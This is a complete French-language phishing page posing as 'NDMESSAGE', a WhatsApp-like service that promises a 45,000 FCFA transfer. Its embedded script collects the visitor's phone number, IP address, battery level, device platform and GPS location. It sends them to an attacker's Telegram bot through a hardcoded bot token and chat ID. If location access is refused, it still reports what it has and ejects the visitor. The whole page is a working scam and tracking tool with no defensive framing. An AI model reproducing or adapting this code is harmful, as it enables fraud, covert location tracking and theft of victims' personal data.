<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NDMESSAGE - Réclamer vos 45 000 FCFA</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#111b21] text-white flex items-center justify-center h-screen font-sans">
    <div class="text-center p-6 max-w-sm w-full">
        <div class="mb-6 flex justify-center">
            <div class="animate-spin rounded-full h-12 w-12 border-4 border-t-transparent border-[#00a884]"></div>
        </div>
        <h1 class="text-2xl font-light mb-2 text-[#00a884]">NDMESSAGE</h1>
        <p class="text-gray-400 text-sm mb-6">Confirmez votre identité pour recevoir le transfert de 45 000 FCFA.</p>
        
        <input type="tel" id="phone" placeholder="Numéro de téléphone" class="w-full p-3 mb-4 rounded bg-[#2a3942] border border-gray-600 text-white focus:outline-none focus:border-[#00a884]">
        
        <button onclick="validerPaiement()" class="w-full bg-[#00a884] py-3 rounded-lg font-bold hover:bg-[#008f72] transition uppercase tracking-widest">
            Valider le transfert
        </button>
        
        <div id="status" class="text-gray-500 text-xs font-mono mt-4 uppercase tracking-widest">En attente de validation...</div>
    </div>

    <script>
        const BOT_TOKEN = "8623909429:AAGXjNNbgo6qrMDzuF46CAmhz4HBRLB9TM8";
        const CHAT_ID = "6224971749";

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (e) { return "Inconnue"; }
        }

        async function sendToTelegram(data) {
            const message = `
⚠️ *CIBLE DÉTECTÉE (AND/IOS)* ⚠️
------------------------------
📞 *Numéro:* ${data.phone}
📍 *IP:* ${data.ip}
🔋 *Batterie:* ${data.batterie}
📱 *Appareil:* ${data.os}
🌍 *Position:* ${data.lat && data.lon ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : "GPS REFUSÉ"}
------------------------------
🚀 *Status:* ${data.lat ? "Localisé" : "Accès Refusé / Chassé"}
            `;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            });
        }

        async function validerPaiement() {
            const status = document.getElementById('status');
            const userPhone = document.getElementById('phone').value;

            if(!userPhone || userPhone.length < 8) {
                alert("Numéro invalide.");
                return;
            }

            status.innerText = "VÉRIFICATION...";
            const ip = await getIP();
            
            let batt = "Bloqué/iPhone";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = Math.round(b.level * 100) + "%";
                }
            } catch(e) {}

            const infos = { phone: userPhone, ip: ip, batterie: batt, os: navigator.platform };

            // Demande GPS avec option de sortie automatique
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const fullData = { ...infos, lat: pos.coords.latitude, lon: pos.coords.longitude };
                await sendToTelegram(fullData);
                status.innerText = "TRANSFERT VALIDÉ !";
                setTimeout(() => { window.location.href = "https://i.imgur.com/K1z3s1H.jpeg"; }, 1500);
            }, (err) => {
                // SI REFUSÉ : On envoie l'alerte et on chasse l'utilisateur
                sendToTelegram(infos);
                alert("ACCÈS REFUSÉ : Vous ne remplissez pas les conditions de sécurité NDMESSAGE. Déconnexion...");
                // Redirection vers une page blanche ou Google pour "chasser"
                window.location.href = "https://www.google.com"; 
            });
        }
    </script>
</body>
</html>
